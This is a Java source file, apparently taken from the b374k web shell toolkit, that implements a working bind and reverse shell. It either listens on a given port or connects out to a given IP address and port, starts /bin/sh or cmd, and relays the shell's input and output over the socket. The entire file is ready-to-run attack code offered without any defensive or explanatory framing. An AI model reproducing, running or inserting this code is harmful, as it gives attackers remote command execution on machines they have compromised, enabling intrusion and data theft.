// https://github.com/b374k/b374k
import java.io.*;
import java.net.*;

public class RS{
    static class pt extends Thread{
        final InputStream is;
        final OutputStream out;
        pt(InputStream is, OutputStream out){this.is=is;this.out=out;start();}
        @Override
        public void run(){
            try{
                byte[] b = new byte[8192];
                int c;
                while((c = is.read(b))>=0) {
                    out.write(b,0,c);
                    out.flush();
                }
                out.close();
            }catch(Exception e){}
        }
    }
    public static void main(String[] args){
        int port;
        String cmd = "/bin/sh";
        if(System.getProperty("os.name").toLowerCase().indexOf("win")>=0){cmd = "cmd";}
        Socket h = null;
        try{
            if(args.length==1){
                port = Integer.parseInt(args[0]);
                ServerSocket s = new ServerSocket(port);
                h = s.accept();
            }else if(args.length==2){
                port = Integer.parseInt(args[0]);
                String ip = args[1];
                h = new Socket(ip, port);
            }
            if(args.length==1 || args.length==2){
                InputStream gis = h.getInputStream();
                OutputStream gos = h.getOutputStream();
                gos.write("b374k shell : connected\n".getBytes());
                Process p = Runtime.getRuntime().exec(cmd);

                new pt(p.getInputStream(), gos);
                new pt(gis, p.getOutputStream());
            }
        }catch(Exception e){e.printStackTrace();}
    }
}
